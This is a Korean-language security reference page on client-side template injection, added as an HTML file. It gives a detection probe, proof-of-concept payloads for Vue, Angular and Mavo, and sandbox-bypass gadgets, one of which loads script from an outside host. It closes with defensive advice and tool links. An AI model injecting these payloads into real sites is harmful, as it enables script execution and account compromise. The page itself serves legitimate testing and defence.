@@ -1,0 +1,119 @@
+<!doctype html>
+<html lang="ko">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>CSTI Attack — PIXN</title>
+  <meta name="description" content="CSTI Attack — Vulnerabilities, attack surfaces, and defensive verification notes.">
+  <meta property="og:title" content="CSTI Attack — PIXN"><meta property="og:description" content="CSTI Attack — Vulnerabilities, attack surfaces, and defensive verification notes."><meta property="og:image" content="https://whgusals84.github.io/pixn-security/og.png"><meta name="twitter:card" content="summary_large_image">
+  <link rel="icon" href="/favicon.svg" type="image/svg+xml">
+  <link rel="stylesheet" href="/assets/style.css">
+</head>
+<body>
+  <header data-site-header data-active="reference"></header>
+  <main class="page article-page" id="main">
+    <header class="article-heading">
+      <p class="eyebrow"><a href="/reference/">Reference</a> / <a href="/reference/attack/">Web Security</a></p>
+      <h1>CSTI Attack</h1>
+      <time datetime="2021-11-22">NOVEMBER 22, 2021</time>
+    </header>
+    <article class="article-body"><h2 id="introduction">Introduction</h2>
+<p>CSTI(Client-Side Template Injection)은 공격자가 Template 코드를 기존 template에 include 시켜서 원하는 액션을 수행하도록 하는 공격입니다. 이 때 template injection이 발생하는 위치가 client-side인 경우 CSTI라고 부릅니다.</p>
+<p>CSTI는 Client-Side에서 Javascript code를 실행할 수 있는데, 이는 XSS와 동일한 공격 벡터와 리스크를 가지며 사실상 거의 같은 공격이라고 봐도 무방하긴 합니다. 다만 CSTI에서만 영향있는 페이로드들이 있어 별도로 Cullinan 문서로 정리합니다.</p>
+<h2 id="offensive-techniques">Offensive techniques</h2>
+<h3 id="detect">Detect</h3>
+<p>CSTI는 SSTI와 비슷하게 Template Engine이 서비스에 같이 존재해야 발생할 수 있는 조건이 충족됩니다. 여기서 이야기하는 Template Engine은 일반적으로 웹 FE 구성에서 많이 사용되는 VueJS, AngularJS, React 등을 의미하며 사용자의 입력값이 각 프레임워크에서 사용하는 Template 문법에 영향을 줄 수 있을 때 CSTI 공격이 성공할 수 있습니다.</p>
+<p>SSTI와 유사하게 Template 문법 내 간단한 숫자 계산으로 통해서 영향력을 검증합니다.</p>
+<pre><code>GET /test?q=abcd{{412*343}}efgh HTTP/1.1
+</code></pre>
+<p>미취약</p>
+<pre><code>abcd${{412*343}}efgh
+</code></pre>
+<p>취약</p>
+<pre><code>abcd141316efgh
+</code></pre>
+<h3 id="exploitation">Exploitation</h3>
+<h4 id="vue">Vue</h4>
+<pre><code class="language-html hljs"><span class="hljs-punctuation">&lt;</span><span class="hljs-name">div</span> <span class="hljs-attr">v-html</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;alert(45)&quot;</span><span class="hljs-punctuation">&gt;</span> aaa<span class="hljs-punctuation">&lt;</span><span class="hljs-punctuation">/</span><span class="hljs-name">div</span><span class="hljs-punctuation">&gt;</span>
+</code></pre>
+<h4 id="angular">Angular</h4>
+<pre><code class="language-html hljs"><span class="hljs-punctuation">&lt;</span><span class="hljs-name">input</span> <span class="hljs-attr">ng-focus</span><span class="hljs-operator">=</span><span class="hljs-string">$event.view.alert(45)</span><span class="hljs-punctuation">&gt;</span>
+</code></pre>
+<h4 id="mavo">Mavo</h4>
+<pre><code class="language-javascript hljs"><span class="hljs-punctuation">[</span><span class="hljs-number">7</span><span class="hljs-operator">*</span><span class="hljs-number">7</span><span class="hljs-punctuation">]</span>
+<span class="hljs-punctuation">[</span><span class="hljs-punctuation">(</span><span class="hljs-number">1</span><span class="hljs-punctuation">,</span>alert<span class="hljs-punctuation">)</span><span class="hljs-punctuation">(</span><span class="hljs-number">1</span><span class="hljs-punctuation">)</span><span class="hljs-punctuation">]</span>
+<span class="hljs-operator">&lt;</span>div mv<span class="hljs-operator">-</span>expressions<span class="hljs-operator">=</span><span class="hljs-string">&quot;{{ }}&quot;</span><span class="hljs-operator">&gt;</span><span class="hljs-punctuation">{</span><span class="hljs-punctuation">{</span>top<span class="hljs-punctuation">.</span>alert<span class="hljs-punctuation">(</span><span class="hljs-number">1</span><span class="hljs-punctuation">)</span><span class="hljs-punctuation">}</span><span class="hljs-punctuation">}</span><span class="hljs-operator">&lt;</span>/div&gt;
+<span class="hljs-punctuation">[</span>self<span class="hljs-punctuation">.</span>alert<span class="hljs-punctuation">(</span><span class="hljs-number">1</span><span class="hljs-punctuation">)</span><span class="hljs-punctuation">]</span>
+javascript<span class="hljs-operator">:</span>alert<span class="hljs-punctuation">(</span><span class="hljs-number">1</span><span class="hljs-punctuation">)</span><span class="hljs-operator">%</span><span class="hljs-number">252</span>f<span class="hljs-operator">%</span><span class="hljs-number">252</span>f<span class="hljs-punctuation">.</span><span class="hljs-punctuation">.</span><span class="hljs-operator">%</span><span class="hljs-number">252</span>fcss<span class="hljs-operator">-</span>images
+<span class="hljs-punctuation">[</span>Omglol mod <span class="hljs-number">1</span> mod self<span class="hljs-punctuation">.</span>alert <span class="hljs-punctuation">(</span><span class="hljs-number">1</span><span class="hljs-punctuation">)</span> andlol<span class="hljs-punctuation">]</span>
+<span class="hljs-punctuation">[</span><span class="hljs-string">&#39;&#39;</span><span class="hljs-operator">=</span><span class="hljs-string">&#39;&#39;</span>or self<span class="hljs-punctuation">.</span>alert<span class="hljs-punctuation">(</span>lol<span class="hljs-punctuation">)</span><span class="hljs-punctuation">]</span>
+<span class="hljs-operator">&lt;</span>a data<span class="hljs-operator">-</span>mv<span class="hljs-operator">-</span><span class="hljs-keyword">if</span><span class="hljs-operator">=</span><span class="hljs-string">&#39;1 or self.alert(1)&#39;</span><span class="hljs-operator">&gt;</span>test<span class="hljs-operator">&lt;</span>/a&gt;
+<span class="hljs-operator">&lt;</span>div data<span class="hljs-operator">-</span>mv<span class="hljs-operator">-</span>expressions<span class="hljs-operator">=</span><span class="hljs-string">&quot;lolx lolx&quot;</span><span class="hljs-operator">&gt;</span>lolxself<span class="hljs-punctuation">.</span>alert<span class="hljs-punctuation">(</span><span class="hljs-string">&#39;lol&#39;</span><span class="hljs-punctuation">)</span>lolx<span class="hljs-operator">&lt;</span>/div&gt;
+<span class="hljs-operator">&lt;</span>a href<span class="hljs-operator">=</span><span class="hljs-punctuation">[</span>javascript<span class="hljs-operator">&amp;</span><span class="hljs-string">&#39;:alert(1)&#39;</span><span class="hljs-punctuation">]</span><span class="hljs-operator">&gt;</span>test<span class="hljs-operator">&lt;</span>/a&gt;
+<span class="hljs-punctuation">[</span>self<span class="hljs-punctuation">.</span>alert<span class="hljs-punctuation">(</span><span class="hljs-number">1</span><span class="hljs-punctuation">)</span>mod1<span class="hljs-punctuation">]</span>
+</code></pre>
+<h3 id="bypass-protection">Bypass protection</h3>
+<h4 id="vue-1">Vue</h4>
+<pre><code class="language-javascript hljs"><span class="hljs-punctuation">{</span><span class="hljs-punctuation">{</span>toString<span class="hljs-punctuation">(</span><span class="hljs-punctuation">)</span><span class="hljs-punctuation">.</span>constructor<span class="hljs-punctuation">.</span>constructor<span class="hljs-punctuation">(</span><span class="hljs-string">&#39;alert(1)&#39;</span><span class="hljs-punctuation">)</span><span class="hljs-punctuation">(</span><span class="hljs-punctuation">)</span><span class="hljs-punctuation">}</span><span class="hljs-punctuation">}</span>
+<span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Function</span><span class="hljs-punctuation">(</span>code<span class="hljs-punctuation">)</span>
+<span class="hljs-punctuation">{</span><span class="hljs-punctuation">{</span>_c<span class="hljs-punctuation">.</span>constructor<span class="hljs-punctuation">(</span><span class="hljs-string">&#39;alert(1)&#39;</span><span class="hljs-punctuation">)</span><span class="hljs-punctuation">(</span><span class="hljs-punctuation">)</span><span class="hljs-punctuation">}</span><span class="hljs-punctuation">}</span>
+<span class="hljs-operator">&lt;</span>p v<span class="hljs-operator">-</span>show<span class="hljs-operator">=</span><span class="hljs-string">&quot;_c.constructor`alert(1)`()&quot;</span><span class="hljs-operator">&gt;</span>
+<span class="hljs-operator">&lt;</span>x v<span class="hljs-operator">-</span>on<span class="hljs-operator">:</span>click<span class="hljs-operator">=</span><span class="hljs-string">&#39;_b.constructor`alert(1)`()&#39;</span><span class="hljs-operator">&gt;</span>click<span class="hljs-operator">&lt;</span>/x&gt;
+<span class="hljs-operator">&lt;</span>x v<span class="hljs-operator">-</span>bind<span class="hljs-operator">:</span>a<span class="hljs-operator">=</span><span class="hljs-string">&#39;_b.constructor`alert(1)`()&#39;</span><span class="hljs-operator">&gt;</span>
+<span class="hljs-operator">&lt;</span>x v<span class="hljs-operator">-</span>bind<span class="hljs-operator">:</span>is<span class="hljs-operator">=</span><span class="hljs-string">&quot;&#39;script&#39;&quot;</span> src<span class="hljs-operator">=</span><span class="hljs-string">&quot;//14.rs&quot;</span> <span class="hljs-operator">/</span><span class="hljs-operator">&gt;</span>
+<span class="hljs-operator">&lt;</span>x is<span class="hljs-operator">=</span>script src<span class="hljs-operator">=</span><span class="hljs-comment">//⑭.₨&gt;
+</span><span class="hljs-comment"></span><span class="hljs-operator">&lt;</span>img src @error<span class="hljs-operator">=</span><span class="hljs-string">&quot;e=$event.path;e[e.length-1].alert(1)&quot;</span><span class="hljs-operator">&gt;</span>
+<span class="hljs-operator">&lt;</span>img src @error<span class="hljs-operator">=</span><span class="hljs-string">&quot;e=$event.path.pop().alert(1)&quot;</span><span class="hljs-operator">&gt;</span>
+<span class="hljs-operator">&lt;</span>img src @error<span class="hljs-operator">=</span><span class="hljs-string">&quot;e=$event.composedPath().pop().alert(1)&quot;</span><span class="hljs-operator">&gt;</span>
+<span class="hljs-operator">&lt;</span>img src @error<span class="hljs-operator">=</span><span class="hljs-keyword">this</span><span class="hljs-punctuation">.</span>alert<span class="hljs-punctuation">(</span><span class="hljs-number">1</span><span class="hljs-punctuation">)</span><span class="hljs-operator">&gt;</span>
+<span class="hljs-punctuation">{</span><span class="hljs-punctuation">{</span><span class="hljs-operator">-</span><span class="hljs-keyword">function</span><span class="hljs-punctuation">(</span><span class="hljs-punctuation">)</span><span class="hljs-punctuation">{</span><span class="hljs-keyword">this</span><span class="hljs-punctuation">.</span>alert<span class="hljs-punctuation">(</span><span class="hljs-number">1</span><span class="hljs-punctuation">)</span><span class="hljs-punctuation">}</span><span class="hljs-punctuation">(</span><span class="hljs-punctuation">)</span><span class="hljs-punctuation">}</span><span class="hljs-punctuation">}</span>
+<span class="hljs-operator">&lt;</span>svg @load<span class="hljs-operator">=</span><span class="hljs-keyword">this</span><span class="hljs-punctuation">.</span>alert<span class="hljs-punctuation">(</span><span class="hljs-number">1</span><span class="hljs-punctuation">)</span><span class="hljs-operator">&gt;</span>
+<span class="hljs-operator">&lt;</span>svg@load<span class="hljs-operator">=</span><span class="hljs-keyword">this</span><span class="hljs-punctuation">.</span>alert<span class="hljs-punctuation">(</span><span class="hljs-number">1</span><span class="hljs-punctuation">)</span><span class="hljs-operator">&gt;</span>
+</code></pre>
+<p>Minimized</p>
+<pre><code class="language-javascript hljs"><span class="hljs-punctuation">{</span><span class="hljs-punctuation">{</span>_c<span class="hljs-punctuation">.</span>constructor<span class="hljs-punctuation">(</span><span class="hljs-string">&#39;alert(1)&#39;</span><span class="hljs-punctuation">)</span><span class="hljs-punctuation">(</span><span class="hljs-punctuation">)</span><span class="hljs-punctuation">}</span><span class="hljs-punctuation">}</span>  <span class="hljs-comment">// (32 bytes)
+</span><span class="hljs-comment"></span><span class="hljs-punctuation">{</span><span class="hljs-punctuation">{</span>_b<span class="hljs-punctuation">.</span>constructor<span class="hljs-string">`</span><span class="hljs-string">alert(1)</span><span class="hljs-string">`</span><span class="hljs-punctuation">(</span><span class="hljs-punctuation">)</span><span class="hljs-punctuation">}</span><span class="hljs-punctuation">}</span>    <span class="hljs-comment">// (30 bytes)
+</span><span class="hljs-comment"></span></code></pre>
+<h4 id="angular-1">Angular</h4>
+<pre><code class="language-java hljs"><span class="hljs-punctuation">{</span><span class="hljs-punctuation">{</span>constructor<span class="hljs-punctuation">.</span><span class="hljs-attr">constructor</span><span class="hljs-punctuation">(</span>&#39;alert<span class="hljs-punctuation">(</span><span class="hljs-number">1</span><span class="hljs-punctuation">)</span>&#39;<span class="hljs-punctuation">)</span><span class="hljs-punctuation">(</span><span class="hljs-punctuation">)</span><span class="hljs-punctuation">}</span><span class="hljs-punctuation">}</span>
+<span class="hljs-punctuation">{</span><span class="hljs-punctuation">{</span><span class="hljs-operator">[</span><span class="hljs-operator">]</span><span class="hljs-punctuation">.</span><span class="hljs-attr">pop</span><span class="hljs-punctuation">.</span><span class="hljs-attr">constructor</span><span class="hljs-operator">&amp;</span>#<span class="hljs-number">40</span>&#39;alert\u00281\u0029&#39;<span class="hljs-operator">&amp;</span>#<span class="hljs-number">41</span><span class="hljs-operator">&amp;</span>#<span class="hljs-number">40</span><span class="hljs-operator">&amp;</span>#<span class="hljs-number">41</span><span class="hljs-punctuation">}</span><span class="hljs-punctuation">}</span>
+<span class="hljs-punctuation">{</span><span class="hljs-punctuation">{</span><span class="hljs-number">0</span><span class="hljs-operator">[</span>a<span class="hljs-operator">=</span>&#39;constructor&#39;<span class="hljs-operator">]</span><span class="hljs-operator">[</span>a<span class="hljs-operator">]</span><span class="hljs-punctuation">(</span>&#39;alert<span class="hljs-punctuation">(</span><span class="hljs-number">1</span><span class="hljs-punctuation">)</span>&#39;<span class="hljs-punctuation">)</span><span class="hljs-punctuation">(</span><span class="hljs-punctuation">)</span><span class="hljs-punctuation">}</span><span class="hljs-punctuation">}</span>
+<span class="hljs-punctuation">{</span><span class="hljs-punctuation">{</span>$eval<span class="hljs-punctuation">.</span><span class="hljs-attr">constructor</span><span class="hljs-punctuation">(</span>&#39;alert<span class="hljs-punctuation">(</span><span class="hljs-number">1</span><span class="hljs-punctuation">)</span>&#39;<span class="hljs-punctuation">)</span><span class="hljs-punctuation">(</span><span class="hljs-punctuation">)</span><span class="hljs-punctuation">}</span><span class="hljs-punctuation">}</span>
+<span class="hljs-punctuation">{</span><span class="hljs-punctuation">{</span>$on<span class="hljs-punctuation">.</span><span class="hljs-attr">constructor</span><span class="hljs-punctuation">(</span>&#39;alert<span class="hljs-punctuation">(</span><span class="hljs-number">1</span><span class="hljs-punctuation">)</span>&#39;<span class="hljs-punctuation">)</span><span class="hljs-punctuation">(</span><span class="hljs-punctuation">)</span><span class="hljs-punctuation">}</span><span class="hljs-punctuation">}</span>
+</code></pre>
+<h2 id="defensive-techniques">Defensive techniques</h2>
+<p>CSTI는 대다수 Injection 공격과 동일하게 Sanitization, Input validation을 이중으로 적용하는 것이 가장 좋은 형태의 대응방안이고 어려운 경우 한가지의 대응 방안을 택하거나 Sandboxing을 겸해서 처리하는 형태로 대응이 가능합니다.</p>
+<h3 id="sanitization">Sanitization</h3>
+<p>사용자 입력으로 부터 Template을 생성하지 않도록 처리해야합니다. 사용자 입력이 필요한 경우 Template 자체에서 제공하는 Parameter를 통해 받아 처리하도록 구성하여 Template 자체에 영향을 줄 수 없도록 제한해야 합니다.</p>
+<h3 id="input-validation">Input Validation</h3>
+<p>마지막으로 사용자 입력에서 { } [ ] 과 같은 특수문자 자체를 받지 못하도록 Escape 처리하는 로직을 적용하여 대응할 수 있습니다. 이는 일부 XSS, SQLi에서 대응하는 방식과 동일합니다.</p>
+<pre><code>{ }
+[ ]
+&lt; &gt;
+등 XSS 대응방안과 유사합니다.
+</code></pre>
+<h3 id="sandboxing">Sandboxing</h3>
+<p>사용자 입력 값을 기반으로 Template을 생성하고 렌더링해야 하는 경우 어쩔 수 없이 사용자 입력으로 Template을 처리할 수 밖에 없습니다. 이 때 사용자 입력으로 부터 받는 Template은 Sandboxing 하여 공격코드가 실제로 영향을 끼칠 수 없도록 제한하는 방법으로도 대응할 수 있습니다.</p>
+<p>다만 Sandboxing의 경우 우회할 여지가 충분히 있기 때문에 가급적 단독으로 사용하는 것 보단 위 2개와 혼용하여 사용하는 것을 추천드립니다.</p>
+<h2 id="tools">Tools</h2>
+<ul>
+<li>https://github.com/epinna/tplmap</li>
+<li><a href="https://github.com/PortSwigger/backslash-powered-scanner">backslash scanner in burpsuite</a></li>
+<li>BAV in <a href="https://github.com/hahwul/dalfox">dalfox</a></li>
+</ul>
+<h2 id="articles">Articles</h2>
+<ul>
+<li>https://www.hahwul.com/2017/07/12/web-hacking-angularjs-sandboxdom-based/</li>
+</ul>
+<h2 id="references">References</h2>
+<ul>
+<li><a href="https://book.hacktricks.xyz/pentesting-web/client-side-template-injection-csti">https://book.hacktricks.xyz/pentesting-web/client-side-template-injection-csti</a></li>
+<li><a href="https://portswigger.net/kb/issues/00200308_client-side-template-injection">https://portswigger.net/kb/issues/00200308_client-side-template-injection</a></li>
+<li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/XSS%20in%20Angular.md">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS Injection/XSS in Angular.md</a></li>
+<li><a href="https://portswigger.net/research/evading-defences-using-vuejs-script-gadgets">https://portswigger.net/research/evading-defences-using-vuejs-script-gadgets</a></li>
+</ul></article>
+    <footer class="article-source"><span>Republished with permission</span><a href="https://www.hahwul.com/cullinan/attack/csti/" rel="noopener noreferrer">Original source ↗</a></footer>
+  </main>
+  <footer data-site-footer></footer><script src="/assets/site.js"></script>
+</body>
+</html>
